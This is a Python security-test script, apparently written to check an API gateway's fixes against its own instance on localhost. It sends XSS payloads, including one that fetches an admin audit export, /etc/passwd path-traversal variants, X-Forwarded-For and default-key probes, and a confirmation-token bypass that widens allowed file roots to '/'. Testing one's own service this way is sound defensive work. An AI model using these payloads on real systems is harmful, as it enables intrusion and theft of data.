#!/usr/bin/env python3
"""Deep-dive penetration test"""
import requests, json, time

BASE = 'http://127.0.0.1:18889'
KEY = 'redteam-test-key-2026'

def tool(name, args=None):
    h = {'X-API-Key': KEY, 'Content-Type': 'application/json'}
    return requests.post(f'{BASE}/api/tools/{name}', headers=h, json=args or {}, timeout=10)

def r(method, path, j=None, h=None):
    hh = {'X-API-Key': KEY}
    if h:
        hh.update(h)
    if method == 'GET':
        return requests.get(BASE + path, headers=hh, timeout=10)
    if method == 'POST':
        return requests.post(BASE + path, headers=hh, json=j, timeout=10)
    return requests.request(method, BASE + path, headers=hh, json=j, timeout=10)

# ═══ 1. 共享信息XSS ═══
print('=== SHARED INFO XSS ===')
for payload in [
    '<script>alert(1)</script>',
    '"><svg onload=alert(1)>',
    'javascript:alert(1)',
    '<img src=x onerror=fetch("/api/admin/audit/export")>',
]:
    resp = tool('tars_shared_info_add', {
        'title': payload,
        'content': 'test content',
        'type': 'note',
        'scope': 'tenant'
    })
    print(f'  title={payload[:40]}: {resp.status_code} {resp.text[:200]}')

# ═══ 2. 限速器绕过测试 ═══
print('=== RATE LIMIT BYPASS ===')
print('Testing rapid burst...')
statuses = []
for i in range(40):
    resp = tool('tars_file_list', {'path': '/tmp/tsg-test/data'})
    statuses.append(resp.status_code)
print(f'  40 rapid: {statuses[:20]}...')
print(f'  429 count: {statuses.count(429)}')
print(f'  200 count: {statuses.count(200)}')
print(f'  403 count: {statuses.count(403)}')

# 等限速重置
time.sleep(30)

# ═══ 3. 审计链验证（攻击痕迹） ═══
print('=== AUDIT EXPORT (after attacks) ===')
resp = r('GET', '/api/admin/audit/export')
print(f'  status: {resp.status_code}, length: {len(resp.text)}')
if resp.status_code == 200:
    lines = resp.text.strip().split('\n')
    print(f'  total entries: {len(lines)}')
    # 查找攻击痕迹
    interesting = [l for l in lines if any(x in l for x in ['PATH_TRAVERSAL', 'BLOCKED', 'WAF', 'ACCESS_DENIED', 'SSRF', 'CONFIRM'])]
    print(f'  interesting entries: {len(interesting)}')
    for l in interesting[:5]:
        print(f'    {l[:200]}')

# ═══ 4. 工具调用不带name路径 ═══
print('=== TOOL WITH WRONG NAME ===')
for name in ['admin_exec', '../etc', 'shell', 'eval', 'runtime', 'system']:
    h = {'X-API-Key': KEY, 'Content-Type': 'application/json'}
    resp = requests.post(f'{BASE}/api/tools/{name}', headers=h, json={'cmd': 'ls'}, timeout=10)
    body = resp.text[:200]
    flag = ' [INFOLEAK]' if 'outside' in body or 'config' in body.lower() and 'path' in body.lower() else ''
    print(f'  {name}: {resp.status_code} {body[:150]}{flag}')

# ═══ 5. 路径遍历的更多变体 ═══
print('=== PATH TRAVERSAL VARIANTS ===')
for path in [
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..%5c..%5c..%5cetc%5cpasswd',
    '..;/etc/passwd',
    '/etc/./passwd',
    '/etc//passwd',
    '/etc/../etc/passwd',
    './../etc/passwd',
    '..\\..\\..\\etc\\passwd',
    '/tmp/tsg-test/data/../symlink_escape/passwd',
    'symlink_escape/passwd',
    'symlink_escape/../',
]:
    resp = tool('tars_file_read', {'path': path})
    flag = ''
    if 'root:' in resp.text:
        flag = ' [PATH TRAVERSAL HIT]'
    print(f'  {path}: {resp.status_code} {resp.text[:150]}{flag}')

# ═══ 6. 二次确认绕过测试 ═══
print('=== CONFIRM TOKEN BYPASS ===')
# paths.allowedRoots 需要确认，测试是否能伪造confirm_token
resp = tool('tars_config_set', {'path': 'paths.allowedRoots', 'value': ['/'], '_tsgIdentity': 'admin'})
print(f'  with _tsgIdentity: {resp.status_code} {resp.text[:300]}')

# ═══ 7. 速率限制键绕过 ═══
print('=== RATE LIMIT KEY BYPASS (v3.7.1 P0-2) ===')
print('  默认以 socket 对端 IP 为限速键（无代理）')
print('  testing X-Forwarded-For without trusted proxy...')
h = {'X-API-Key': KEY, 'X-Forwarded-For': '1.2.3.4'}
for i in range(15):
    resp = requests.get(BASE + '/api/admin/v322/status', headers=h, timeout=5)
    if resp.status_code == 429:
        print(f'    hit 429 at {i+1}')
        break
print(f'  statuses: {[resp.status_code]}')

# ═══ 8. 默认密钥策略测试 ═══
print('=== DEFAULT KEY POLICY (v3.7.1 P0-1) ===')
print('  Start test: try to connect with default key on localhost...')
h = {'X-API-Key': 'tars-gateway-key'}
resp = requests.get(BASE + '/api/admin/v322/status', headers=h, timeout=5)
print(f'  default key status: {resp.status_code} {resp.text[:150]}')

# ═══ 9. 共享信息检索测试 ═══
print('=== SHARED INFO SEARCH ===')
resp = tool('tars_shared_info_search', {'query': 'alert'})
print(f'  search alert: {resp.status_code} {resp.text[:300]}')

# ═══ 10. 上下文包注入 ═══
print('=== CONTEXT PACK INJECTION ===')
resp = tool('tars_context_build', {'budget': 100000})
print(f'  huge budget: {resp.status_code} {resp.text[:300]}')

# ═══ 11. 跨工具调用审计链篡改 ═══
print('=== AUDIT CHAIN INTEGRITY ===')
resp = r('POST', '/api/admin/audit/verify', j={})
print(f'  verify: {resp.status_code} {resp.text[:300]}')

# ═══ 12. CORS具体行为 ═══
print('=== CORS BEHAVIOR ===')
for origin in ['http://evil.com', 'http://tauri://localhost', 'http://localhost:3000', 'null']:
    h = {'X-API-Key': KEY, 'Origin': origin}
    resp = requests.get(BASE + '/api/admin/v322/status', headers=h, timeout=5)
    print(f'  Origin={origin}: {resp.status_code}, ACAO={resp.headers.get("Access-Control-Allow-Origin", "N/A")}')

# ═══ 13. 未限速请求下的审计 ═══
print('=== AUDIT VERIFY (with current chain) ===')
resp = r('POST', '/api/admin/audit/verify', j={})
data = resp.json() if resp.status_code == 200 else {}
print(f'  status: {resp.status_code} intact={data.get("intact")} total={data.get("total")}')

# ═══ 14. 错误信息泄露测试 ═══
print('=== ERROR MESSAGE LEAKAGE ===')
# 尝试各种错误请求看错误消息是否泄露内部信息
h = {'X-API-Key': KEY}
for path in ['/api/admin/nonexistent', '/api/tools/nonexistent', '/api/admin/key-rotate']:
    resp = requests.get(BASE + path, headers=h, timeout=5)
    print(f'  GET {path}: {resp.status_code} {resp.text[:200]}')

# ═══ 15. 配置下划线键测试（v3.7.1 P0-3） ═══
print('=== UNDERSCORE KEY HANDLING ===')
# 测试当前配置中是否有 _ 说明 / _ 注释 keys
# （之前 config.json 有此问题但 v3.7.1 应已剥离）
resp = r('GET', '/api/admin/v322/status')
if resp.status_code == 200:
    data = resp.json()
    config_str = json.dumps(data, ensure_ascii=False)
    has_underscore = '_说明' in config_str or '_comment' in config_str
    print(f'  config has _说明 keys: {has_underscore}')
    if has_underscore:
        print('  WARNING: v3.7.1 P0-3 (underscore strip) may not be effective')